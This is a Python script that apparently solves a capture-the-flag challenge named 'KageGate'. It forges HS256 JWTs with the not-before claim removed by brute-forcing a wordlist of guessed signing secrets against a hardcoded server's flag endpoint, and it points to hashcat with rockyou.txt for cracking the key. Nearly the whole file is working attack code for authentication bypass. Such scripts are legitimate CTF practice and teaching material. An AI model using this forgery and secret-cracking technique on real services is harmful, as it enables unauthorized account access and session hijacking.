#!/usr/bin/env python3
"""
Final KageGate solution - forge JWT without nbf
"""

import requests
import base64
import json
import hmac
import hashlib
import re

BASE_URL = "http://212.2.254.96:7004/"

# Original JWT components from the challenge
header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "sub": "8765108499",
    "email": "john@mail.com",
    "username": "clan_shimazu",
    "scope": "username email",
    "iat": 1768645703,
    # "nbf": 1800181703,  # REMOVE THIS - it's the problem!
    "exp": 1800181883,
    "iss": "kagegate",
    "aud": "dojo-web"
}

def forge_jwt_with_secret(secret):
    """Forge JWT with given secret"""
    # Encode header
    header_encoded = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    # Encode payload (without nbf)
    payload_encoded = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    # Create message
    message = f"{header_encoded}.{payload_encoded}"
    
    # Sign with HMAC-SHA256
    signature = base64.urlsafe_b64encode(
        hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
    ).decode().rstrip('=')
    
    return f"{message}.{signature}"

def test_jwt(token):
    """Test JWT against flag endpoint"""
    session = requests.Session()
    session.cookies.set('auth', token)
    
    resp = session.get(f"{BASE_URL}flag")
    
    print(f"[*] Status: {resp.status_code}")
    print(f"[*] Response: {resp.text[:500]}")
    
    if 'ctf7{' in resp.text.lower():
        print(f"\n[+++] FLAG FOUND!")
        flags = re.findall(r'[Cc][Tt][Ff]7\{[^}]+\}', resp.text)
        for flag in flags:
            print(f"    {flag}")
        return True
    
    return False

def main():
    print("[*] KageGate Final Solution")
    print("="*60)
    
    print(f"\n[*] JWT Header: {json.dumps(header, indent=2)}")
    print(f"\n[*] JWT Payload (without nbf): {json.dumps(payload, indent=2)}")
    
    # Extended wordlist with more variations
    secrets = [
        # Basic
        'secret', 'password', '123456', 'admin', 'key',
        
        # Theme-based
        'kagegate', 'kage', 'gate', 'shadow', 'ninja', 'samurai',
        'dojo', 'scroll', 'scrolls', 'seal', 'seals', 'shinobi',
        
        # From JWT
        'clan_shimazu', 'shimazu', 'john', 'dojo-web',
        '8765108499', 'john@mail.com',
        
        # Combinations
        'kagegate-secret', 'dojo-web-secret', 'jwt-secret',
        'kagegate:dojo-web', 'kage-gate', 'shadow-gate',
        
        # Common JWT secrets
        'your-256-bit-secret', 'your-secret-key', 'HS256',
        'jwt', 'token', 'auth',
        
        # More Japanese
        'ronin', 'katana', 'bushido', 'sensei', 'shogun',
        'hanzo', 'hattori', 'iga', 'koga',
        
        # Simple
        'test', 'dev', 'demo', '', 'null',
        
        # Numbers
        '12345', '123456789', '1234567890',
        
        # Time-related
        'time', 'nbf', 'notbefore', '365', '31536000',
    ]
    
    print(f"\n[*] Trying {len(secrets)} secrets...")
    
    for i, secret in enumerate(secrets):
        if i % 10 == 0:
            print(f"[*] Progress: {i}/{len(secrets)}...")
        
        forged_token = forge_jwt_with_secret(secret)
        
        session = requests.Session()
        session.cookies.set('auth', forged_token)
        resp = session.get(f"{BASE_URL}flag")
        
        if resp.status_code == 200 and 'Unauthorized' not in resp.text:
            print(f"\n[+++] SUCCESS! Secret found: '{secret}'")
            print(f"[+++] Forged JWT: {forged_token[:100]}...")
            
            if test_jwt(forged_token):
                return
    
    print(f"\n[!] No secret found in wordlist")
    print(f"[!] You need to use hashcat with rockyou.txt:")
    print(f"    hashcat -m 16500 jwt_token.txt rockyou.txt")

if __name__ == "__main__":
    main()
